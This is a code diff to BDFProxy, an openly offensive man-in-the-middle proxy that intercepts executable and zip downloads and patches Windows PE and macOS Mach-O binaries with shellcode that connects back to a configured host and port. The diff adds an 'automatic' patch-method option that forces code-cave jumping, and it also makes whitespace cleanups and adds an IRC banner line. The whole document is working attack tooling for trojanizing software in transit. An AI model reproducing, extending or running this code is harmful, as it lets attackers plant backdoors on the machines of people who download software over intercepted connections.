@@ -301,7 +301,7 @@ class proxyMaster(controller.Master):
         patchCount = 0
 
         wasPatched = False
-            
+
         for info in zippyfile.infolist():
             print "[*] >>> Next file in zipfile:", info.filename
 
@@ -409,6 +409,10 @@ class proxyMaster(controller.Master):
                         elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                             cave_jumping = True
 
+                        # if automatic override
+                        if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
+                            cave_jumping = True
+
                         targetFile = pebin.pebin(FILE=binaryFile,
                                                  OUTPUT=os.path.basename(binaryFile),
                                                  SHELL=self.WindowsIntelx64['SHELL'],
@@ -420,6 +424,7 @@ class proxyMaster(controller.Master):
                                                  PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                  SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                  ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
+                                                 PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
                                                  )
 
                         result = targetFile.run_this()
@@ -435,6 +440,10 @@ class proxyMaster(controller.Master):
                         elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                             cave_jumping = True
 
+                        # if automatic override
+                        if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
+                            cave_jumping = True
+
                         targetFile = pebin.pebin(FILE=binaryFile,
                                                  OUTPUT=os.path.basename(binaryFile),
                                                  SHELL=self.WindowsIntelx86['SHELL'],
@@ -445,7 +454,8 @@ class proxyMaster(controller.Master):
                                                  IMAGE_TYPE=self.WindowsType,
                                                  PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                  SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
-                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
+                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT']),
+                                                 PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
                                                  )
 
                         result = targetFile.run_this()
@@ -478,7 +488,7 @@ class proxyMaster(controller.Master):
                                                )
                     result = targetFile.run_this()
 
-            elif binaryHeader[:4].encode('hex') in  ['cefaedfe', 'cffaedfe', 'cafebabe']: # Macho
+            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                 targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                 targetFile.support_check()
 
@@ -487,29 +497,29 @@ class proxyMaster(controller.Master):
                 if targetFile.FAT_FILE is True:
                     if self.FatPriority == 'x86':
                         targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
-                                                   SHELL=self.MachoIntelx86['SHELL'],
-                                                   HOST=self.MachoIntelx86['HOST'],
-                                                   PORT=int(self.MachoIntelx86['PORT']),
-                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
-                                                   )
+                                                       OUTPUT=os.path.basename(binaryFile),
+                                                       SHELL=self.MachoIntelx86['SHELL'],
+                                                       HOST=self.MachoIntelx86['HOST'],
+                                                       PORT=int(self.MachoIntelx86['PORT']),
+                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
+                                                       FAT_PRIORITY=self.FatPriority
+                                                       )
                         result = targetFile.run_this()
 
                     elif self.FatPriority == 'x64':
                         targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
-                                                   SHELL=self.MachoIntelx64['SHELL'],
-                                                   HOST=self.MachoIntelx64['HOST'],
-                                                   PORT=int(self.MachoIntelx64['PORT']),
-                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
-                                                   FAT_PRIORITY=self.FatPriority
-                                                   )
+                                                       OUTPUT=os.path.basename(binaryFile),
+                                                       SHELL=self.MachoIntelx64['SHELL'],
+                                                       HOST=self.MachoIntelx64['HOST'],
+                                                       PORT=int(self.MachoIntelx64['PORT']),
+                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
+                                                       FAT_PRIORITY=self.FatPriority
+                                                       )
                         result = targetFile.run_this()
-          
-                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7': 
+
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                     targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   OUTPUT=os.path.basename(binaryFile),
                                                    SHELL=self.MachoIntelx86['SHELL'],
                                                    HOST=self.MachoIntelx86['HOST'],
                                                    PORT=int(self.MachoIntelx86['PORT']),
@@ -518,9 +528,9 @@ class proxyMaster(controller.Master):
                                                    )
                     result = targetFile.run_this()
 
-                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007': 
+                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                     targetFile = machobin.machobin(FILE=binaryFile,
-                                                   OUTPUT = os.path.basename(binaryFile),
+                                                   OUTPUT=os.path.basename(binaryFile),
                                                    SHELL=self.MachoIntelx64['SHELL'],
                                                    HOST=self.MachoIntelx64['HOST'],
                                                    PORT=int(self.MachoIntelx64['PORT']),
@@ -528,7 +538,7 @@ class proxyMaster(controller.Master):
                                                    FAT_PRIORITY=self.FatPriority
                                                    )
                     result = targetFile.run_this()
-          
+
             return result
 
         except Exception as e:
@@ -546,14 +556,14 @@ class proxyMaster(controller.Master):
                 logging.info("Host whitelist hit: %s, HOST: %s ",
                              str(self.hostwhitelist),
                              str(flow.request.host),
-                           )
+                             )
 
-        elif flow.request.host.lower() in self.hostwhitelist.lower(): 
+        elif flow.request.host.lower() in self.hostwhitelist.lower():
             self.patchIT = True
             logging.info("Host whitelist hit: %s, HOST: %s ",
                          str(self.hostwhitelist),
                          str(flow.request.host),
-                       )
+                         )
 
         else:
             for keyword in self.hostwhitelist:
@@ -562,7 +572,7 @@ class proxyMaster(controller.Master):
                     logging.info("Host whitelist hit: %s, HOST: %s ",
                                  str(self.hostwhitelist),
                                  str(flow.request.host),
-                               )
+                                 )
                     break
 
     def keys_whitelist_check(self, flow):
@@ -574,12 +584,12 @@ class proxyMaster(controller.Master):
             self.patchIT = True
 
         elif type(self.keyswhitelist) is str:
-            if self.keyswhitelist.lower() in flow.request.path.lower(): 
+            if self.keyswhitelist.lower() in flow.request.path.lower():
                 self.patchIT = True
                 logging.info("Keyword whitelist hit: %s, PATH: %s",
                              str(self.keyswhitelist), str(flow.request.path))
 
-        elif flow.request.host.lower() in [x.lower() for x in self.keyswhitelist]: 
+        elif flow.request.host.lower() in [x.lower() for x in self.keyswhitelist]:
             self.patchIT = True
             logging.info("Keyword whitelist hit: %s, PATH: %s",
                          str(self.keyswhitelist), str(flow.request.path))
@@ -808,6 +818,7 @@ except Exception as e:
 m = proxyMaster(server)
 print "[!] Starting BDFProxy"
 print "[!] Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com"
+print "[!] IRC: freenode #BDFactory"
 logging.info("################ Starting BDFProxy ################")
 
 logging.info("[!] ConfigDump %s", json.dumps(userConfig, sort_keys=True, indent=4))
